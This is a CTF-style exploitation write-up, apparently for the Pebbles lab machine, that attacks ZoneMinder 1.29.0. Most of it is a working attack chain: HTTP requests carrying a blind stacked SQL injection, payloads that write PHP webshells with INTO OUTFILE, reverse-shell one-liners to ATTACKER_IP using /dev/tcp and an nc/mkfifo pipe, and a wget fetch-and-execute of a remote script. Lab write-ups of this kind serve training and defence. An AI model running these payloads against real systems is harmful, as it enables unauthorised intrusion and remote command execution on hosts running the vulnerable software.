# ZoneMinder

ZoneMinder `1.29.0` exposed under `/zm/` can have a blind stacked SQL injection in the log query path. On the observed Pebbles target, the SQLi wrote a PHP webshell with `INTO OUTFILE`, which led to a `www-data` shell

## Discovery

Nmap and web indicators:

```text
80/tcp   open  http  Apache httpd 2.4.18 ((Ubuntu))
3305/tcp open  http  Apache httpd 2.4.18 ((Ubuntu))
8080/tcp open  http  Apache httpd 2.4.18 ((Ubuntu))
```

Feroxbuster found ZoneMinder paths:

```text
http://TARGET/zm/
http://TARGET:8080/zm/
```

The console showed:

```text
ZoneMinder Console - Running - default v1.29.0
```

## Blind Stacked SQLi

The log query request accepted stacked SQL in the `limit` parameter:

```http
POST /zm/index.php HTTP/1.1
Host: TARGET
X-Request: JSON
X-Requested-With: XMLHttpRequest
Content-type: application/x-www-form-urlencoded; charset=UTF-8
Cookie: zmSkin=classic; zmCSS=classic; ZMSESSID=SESSION

view=request&request=log&task=query&limit=100;%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29OQkj%29#&minTime=1466674406.084434
```

Useful response data leaked the ZoneMinder webroot path:

```text
/usr/share/zoneminder/www/index.php
```

## Write a PHP Webshell

Use the stacked SQLi to write a shell to Apache's webroot:

```http
POST /zm/index.php HTTP/1.1
Host: TARGET
X-Request: JSON
X-Requested-With: XMLHttpRequest
Content-type: application/x-www-form-urlencoded; charset=UTF-8
Cookie: zmSkin=classic; zmCSS=classic; ZMSESSID=SESSION

view=request&request=log&task=query&limit=100;SELECT%20%22%22%2C%27%3C%3Fphp%20system%28%24_REQUEST%5B0%5D%29%3B%20%3F%3E%27%2C%22%22%2C%22%22%20INTO%20OUTFILE%20%27%2Fvar%2Fwww%2Fhtml%2Fshell.php%27--%20-#&minTime=1466674406.084434
```

Trigger the shell on the Apache service serving `/var/www/html`:

```text
http://TARGET:3305/shell.php?0=id
```

If command output is easier with `shell_exec`, write a second shell:

```sql
SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/s.php';
```

URL-encoded payload:

```text
SELECT%20%22%3C%3Fphp%20echo%20shell_exec%28%24_GET%5B%27c%27%5D%29%3B%3F%3E%22%20INTO%20OUTFILE%20%27%2Fvar%2Fwww%2Fhtml%2Fs.php%27%3B
```

Trigger:

```text
http://TARGET:3305/s.php?c=id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Reverse Shell

Host a shell script and pull it through the webshell:

```bash
cat > shell.sh << 'EOF'
#!/bin/bash
sh -i >& /dev/tcp/ATTACKER_IP/80 0>&1
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc ATTACKER_IP 80 >/tmp/f
EOF

python3 -m http.server 3305
```

```text
http://TARGET:3305/shell.php?0=wget -O /tmp/shell.sh http://ATTACKER_IP:3305/shell.sh
http://TARGET:3305/shell.php?0=chmod 777 /tmp/shell.sh
http://TARGET:3305/shell.php?0=/tmp/shell.sh
```

Catch the shell:

```bash
nc -nlvp 80
```

Successful context:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
Linux pebbles 4.4.0-21-generic
pwd
/var/www/html
```

